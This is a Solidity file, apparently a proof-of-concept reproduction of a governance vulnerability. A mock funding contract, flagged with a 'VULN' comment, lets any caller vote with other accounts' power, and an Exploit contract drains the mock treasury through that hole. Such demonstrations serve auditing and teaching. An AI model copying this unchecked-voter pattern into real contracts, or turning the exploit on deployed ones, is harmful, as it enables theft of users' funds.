// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract AjnaToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ExtraordinaryFunding {
    struct Proposal {
        uint256 votes;
        bool executed;
    }

    AjnaToken public immutable ajnaToken;
    mapping(address => uint256) public votingPower;
    mapping(uint256 => Proposal) public proposals;
    mapping(uint256 => mapping(address => bool)) public voted;
    uint256 public threshold;
    uint256 public nextProposalId;

    constructor(AjnaToken token, uint256 voteThreshold) {
        ajnaToken = token;
        threshold = voteThreshold;
    }

    function setPower(address account, uint256 power) external {
        votingPower[account] = power;
    }

    function proposeExtraordinary() external returns (uint256 id) {
        id = nextProposalId++;
    }

    function voteExtraordinary(address account, uint256 proposalId) external returns (uint256 votesCast) {
        require(!voted[proposalId][account], "already voted");
        // @> VULN: caller can nominate any account instead of msg.sender.
        voted[proposalId][account] = true;
        votesCast = votingPower[account];
        proposals[proposalId].votes += votesCast;
    }

    function executeExtraordinary(address recipient, uint256 proposalId) external {
        Proposal storage proposal = proposals[proposalId];
        require(!proposal.executed && proposal.votes >= threshold, "proposal not passed");
        proposal.executed = true;
        ajnaToken.transfer(recipient, ajnaToken.balanceOf(address(this)));
    }
}

contract Exploit {
    AjnaToken public token;
    ExtraordinaryFunding public grantFund;
    address public constant HOLDER_A = address(0xA1);
    address public constant HOLDER_B = address(0xB2);
    address public constant HOLDER_C = address(0xC3);
    uint256 public stolen;

    constructor() {
        token = new AjnaToken();
        grantFund = new ExtraordinaryFunding(token, 1_000);
    }

    function run() external {
        token.mint(address(grantFund), 1_000);
        grantFund.setPower(HOLDER_A, 400);
        grantFund.setPower(HOLDER_B, 350);
        grantFund.setPower(HOLDER_C, 250);
        uint256 proposalId = grantFund.proposeExtraordinary();
        grantFund.voteExtraordinary(HOLDER_A, proposalId);
        grantFund.voteExtraordinary(HOLDER_B, proposalId);
        grantFund.voteExtraordinary(HOLDER_C, proposalId);
        grantFund.executeExtraordinary(address(this), proposalId);
        stolen = token.balanceOf(address(this));
        require(stolen == 1_000, "proposal did not drain treasury");
    }
}
